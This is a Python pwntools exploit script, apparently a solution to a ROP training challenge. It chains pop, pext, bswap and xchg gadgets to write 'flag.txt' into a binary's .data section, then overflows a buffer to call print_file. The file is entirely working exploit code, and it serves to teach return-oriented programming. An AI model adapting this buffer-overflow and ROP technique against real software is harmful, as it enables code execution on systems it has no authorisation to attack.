from pwn import *


# Padding before overwriting the EIP register
eip_offset = 44



#####################################################
### ADDRESSES #######################################
#####################################################


# Address of .data section
data_section_address = 0x0804a018


# Need to get our string into ebp ready for the next gadget which moves ebp to eax [pext mask]
pop_ebp = 0x080485bb  # pop ebp; ret;

# Pop ecx and bswap (swap between big/little endian) [.data address]
bswap_ecx = 0x08048558  # pop ecx; bswap ecx; ret;


# Mov ebp to eax
# Mov 0xb0bababa to ebx
# pext edx, ebx, eax - (we control the eax [mask])
# Mov 0xdeadbeef to eax (who cares?)
long_pext_gadget = 0x08048543  # mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;


# Exchange a byte in dl (LSB of edx) with byte in memory location pointed to by ecx [write to .data]
xchg_ecx_dl = 0x08048555  # xchg byte ptr [ecx], dl; ret;


# Finally we call print file function, passing in the address of the string (flag.txt)
print_file = 0x80483d0



#####################################################
### MASK VALUES FOR pext edx, ebx, eax ##############
#####################################################


# An array of masked bytes that unmask into "flag.txt"
# We'll be using this mask, which we calculated in a seperate script (find_mask.py)
full_mask = [0xb4b, 0x2dd, 0x1d46, 0xb5a, 0x1db, 0xacd, 0x1ac5, 0xacd]
fluff_xploit = b""



#####################################################
### CRAFTING THE EXPLOIT ############################
#####################################################

# enumerate example
# ``` Code:
# for i,j in enumerate([4,5,6]):
#     print(i,j)
# ```
# ``` Output:
# 0 4
# 1 5
# 2 6
# ```

# Loop through each mask, using index as data section offset
for data_section_offset, mask in enumerate(full_mask):

    # Pop our current mask byte into the ebp
    fluff_xploit += pack(pop_ebp)
    fluff_xploit += pack(mask)


    # Perform pext (masking operation) using 0xb0bababa (hardcoded) and our mask byte, place result in edx (dl)
    fluff_xploit += pack(long_pext_gadget)


    # Pop data section address offset to ecx (also performs bswap to swap endianness, hence us setting to big first)
    fluff_xploit += pack(bswap_ecx)
    fluff_xploit += pack(data_section_address + data_section_offset, endian='big')  # Address of .data section with offset to current char


    # Exchange the byte in edx (dl - result of masking) with the byte pointed to by ecx (our dataset offset)
    fluff_xploit += pack(xchg_ecx_dl)




# Craft payload which injects "flag.txt" into data section of memory
# And calls print_file() with the string memory location
payload = flat(
    asm('nop') * eip_offset,  # Offset - 44 bytes
    fluff_xploit,
    print_file,  # Call print_file()
    0x0,  # Return pointer
    data_section_address  # Location of flag.txt string
)

sys.stdout.buffer.write(payload)
